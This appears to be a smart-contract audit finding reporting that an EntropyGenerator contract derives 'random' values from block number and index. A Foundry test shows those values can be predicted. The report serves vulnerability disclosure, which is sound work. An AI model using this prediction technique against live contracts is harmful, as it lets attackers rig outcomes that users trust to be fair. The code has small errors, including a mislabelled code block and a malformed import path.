# Vulnerability details

## Impact: An attacker could predict future entropy values if they know the block number and index range. This compromises any functionality relying on these "random" numbers for security or fairness.

## Proof of Concept:
The following Test is written in solidity Foundry. the setup is to.
1.Deploy the `EntropyGenerator` contract.
2.Call one of the batch functions (writeEntropyBatch1, etc.).
3.Predict future entropy values using known block numbers and indices:
```javascript

import "forge-std/Test.sol";
import {EntropyGenerator} from "..contracts/EntropyGenerator/EntropyGenerator.sol";

contract EntropyGeneratorTest is Test {
    EntropyGenerator entropyGenerator;
    address allowedCaller = address(0x123);

    function setUp() public {
        entropyGenerator = new EntropyGenerator(allowedCaller);
    }

    function testWeakPRNGPredictability() public {
        // Initialize the entropy slots
        entropyGenerator.writeEntropyBatch1();
        entropyGenerator.writeEntropyBatch2();
        entropyGenerator.writeEntropyBatch3();

        // Predict the entropy value for a specific slot and number index
        uint256 slotIndex = 0;
        uint256 numberIndex = 0;

        // Calculate the expected pseudo-random value using the same logic as in the contract
        uint256 blockNumber = block.number;
        uint256 expectedPseudoRandomValue = uint256(
            keccak256(abi.encodePacked(blockNumber, slotIndex))
        ) % uint256(10) ** 78;

        // Retrieve the actual entropy value from the contract
        uint256 actualEntropy = entropyGenerator.getPublicEntropy(slotIndex, numberIndex);

        // Assert that the predicted value matches the actual value
        assertEq(expectedPseudoRandomValue, actualEntropy, "The PRNG is predictable.");
    }
}

```
